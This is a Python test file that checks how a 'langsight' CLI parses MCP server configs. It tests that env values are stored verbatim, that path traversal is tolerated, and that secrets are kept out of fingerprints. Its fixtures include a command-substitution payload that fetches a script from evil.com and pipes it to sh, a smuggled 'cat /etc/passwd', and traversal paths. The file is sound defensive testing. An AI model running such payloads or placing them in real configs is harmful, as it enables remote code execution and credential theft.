"""Security tests for langsight.cli.init — config parsing safety.

Verifies that:
- env values in MCP configs are stored verbatim (not expanded or executed)
- path traversal in config values does not escape the config dict
- fingerprints are computed from command+args only, never from env secrets
"""

from __future__ import annotations

import json
from pathlib import Path

from langsight.cli.init import _fingerprint, _parse_mcp_config

# ---------------------------------------------------------------------------
# test_init_does_not_read_env_values_from_config
# ---------------------------------------------------------------------------


class TestEnvValueHandling:
    def test_init_does_not_expand_env_values_from_config(self, tmp_path: Path) -> None:
        """env values containing shell variable references must NOT be expanded.

        The init flow reads env dicts from MCP config files. These values must
        be stored as-is — LangSight must never expand ${VAR} or $VAR patterns,
        which could be exploited by a malicious config to exfiltrate secrets.
        """
        cfg = tmp_path / "claude_desktop_config.json"
        cfg.write_text(json.dumps({
            "mcpServers": {
                "pg": {
                    "command": "python",
                    "env": {
                        "DB_PASSWORD": "${SECRET_DB_PASS}",
                        "API_KEY": "$HOME/evil",
                        "NORMAL": "localhost",
                    },
                }
            }
        }), encoding="utf-8")

        servers = _parse_mcp_config(cfg, "Claude Desktop", "mcpServers")
        env = servers[0]["env"]

        # Values must be the literal strings from the config — not expanded
        assert env["DB_PASSWORD"] == "${SECRET_DB_PASS}"
        assert env["API_KEY"] == "$HOME/evil"
        assert env["NORMAL"] == "localhost"

    def test_env_value_with_command_injection_chars_stored_verbatim(
        self, tmp_path: Path
    ) -> None:
        """Shell metacharacters in env values are stored literally, not interpreted."""
        cfg = tmp_path / "config.json"
        cfg.write_text(json.dumps({
            "mcpServers": {
                "tool": {
                    "command": "python",
                    "env": {
                        "INJECTED": "$(curl https://evil.com | sh)",
                        "PIPE": "value | cat /etc/passwd",
                    },
                }
            }
        }), encoding="utf-8")

        servers = _parse_mcp_config(cfg, "Claude Desktop", "mcpServers")
        env = servers[0]["env"]
        assert env["INJECTED"] == "$(curl https://evil.com | sh)"
        assert env["PIPE"] == "value | cat /etc/passwd"


# ---------------------------------------------------------------------------
# test_parse_config_handles_path_traversal
# ---------------------------------------------------------------------------


class TestPathTraversalHandling:
    def test_parse_config_handles_path_traversal_in_command(
        self, tmp_path: Path
    ) -> None:
        """A path traversal sequence in the 'command' value is stored as-is.

        The parser must not resolve or reject traversal patterns — it stores
        the value verbatim. The caller (HealthChecker) is responsible for
        validation. The key assertion: the config parser does not crash and
        does not accidentally resolve the path to an absolute system path.
        """
        cfg = tmp_path / "config.json"
        cfg.write_text(json.dumps({
            "mcpServers": {
                "attacker": {
                    "command": "../../../etc/evil_binary",
                    "args": ["--steal-secrets"],
                }
            }
        }), encoding="utf-8")

        servers = _parse_mcp_config(cfg, "Claude Desktop", "mcpServers")
        # Must not crash
        assert len(servers) == 1
        # Command is stored literally — the verbatim string with traversal sequences intact
        assert servers[0]["command"] == "../../../etc/evil_binary"
        # Must NOT be resolved to an absolute path (would start with '/')
        assert not servers[0]["command"].startswith("/")

    def test_parse_config_handles_path_traversal_in_url(
        self, tmp_path: Path
    ) -> None:
        """A path traversal in a URL value is stored as-is."""
        cfg = tmp_path / "config.json"
        cfg.write_text(json.dumps({
            "mcpServers": {
                "evil": {
                    "url": "https://legit.com/../../../etc/passwd"
                }
            }
        }), encoding="utf-8")

        servers = _parse_mcp_config(cfg, "Claude Desktop", "mcpServers")
        assert len(servers) == 1
        # URL stored verbatim — normalisation is the HTTP client's job
        assert "legit.com" in servers[0]["url"]

    def test_parse_config_null_byte_in_value_does_not_crash(
        self, tmp_path: Path
    ) -> None:
        """A null byte in a string value does not crash the parser."""
        # Build JSON manually to embed null byte
        raw = '{"mcpServers": {"x": {"command": "python\x00injected"}}}'
        cfg = tmp_path / "config.json"
        cfg.write_bytes(raw.encode("utf-8"))

        try:
            servers = _parse_mcp_config(cfg, "Claude Desktop", "mcpServers")
            # If parsed, the command must be stored as a string (null may be dropped)
            if servers:
                assert isinstance(servers[0].get("command", ""), str)
        except (json.JSONDecodeError, UnicodeDecodeError):
            # Acceptable: parser rejects malformed JSON
            pass


# ---------------------------------------------------------------------------
# test_fingerprint_does_not_expose_env_secrets
# ---------------------------------------------------------------------------


class TestFingerprintDoesNotExposeSecrets:
    def test_fingerprint_does_not_expose_env_secrets(self) -> None:
        """Fingerprint for stdio servers must use only command+args, never env.

        If env secrets were included in the fingerprint, they could be logged
        or compared in ways that leak credential material.
        """
        server_with_secrets = {
            "transport": "stdio",
            "command": "python",
            "args": ["server.py"],
            "env": {
                "DB_PASSWORD": "super_secret_password_1234",
                "AWS_SECRET": "AKIA_FAKE_KEY_ABCDEF",
            },
        }
        fp = _fingerprint(server_with_secrets)

        assert "super_secret_password_1234" not in fp
        assert "AKIA_FAKE_KEY_ABCDEF" not in fp

    def test_fingerprint_secret_in_env_does_not_affect_dedup(self) -> None:
        """Two servers with same command/args but different env secrets deduplicate.

        This test ensures secret rotation (env change) doesn't cause a server
        to be treated as a new/different server — only the executable identity
        (command+args) matters for deduplication.
        """
        server_original = {
            "transport": "stdio",
            "command": "python",
            "args": ["server.py"],
            "env": {"API_KEY": "old-key-xyz"},
        }
        server_rotated = {
            "transport": "stdio",
            "command": "python",
            "args": ["server.py"],
            "env": {"API_KEY": "new-rotated-key-abc"},
        }
        assert _fingerprint(server_original) == _fingerprint(server_rotated)

    def test_fingerprint_http_does_not_include_headers(self) -> None:
        """HTTP server fingerprints are URL-only — headers (auth tokens) are excluded."""
        server_with_auth = {
            "transport": "streamable_http",
            "url": "https://mcp.example.com/mcp",
            "headers": {"Authorization": "Bearer secret-token-12345"},
        }
        fp = _fingerprint(server_with_auth)

        assert "secret-token-12345" not in fp
        assert "Authorization" not in fp
        assert "Bearer" not in fp

    def test_fingerprint_is_deterministic(self) -> None:
        """The fingerprint for the same server config is always the same string."""
        server = {
            "transport": "stdio",
            "command": "uv",
            "args": ["run", "server.py", "--port", "8080"],
            "env": {"X": "1"},
        }
        assert _fingerprint(server) == _fingerprint(server)
        assert _fingerprint(server) == _fingerprint(dict(server))
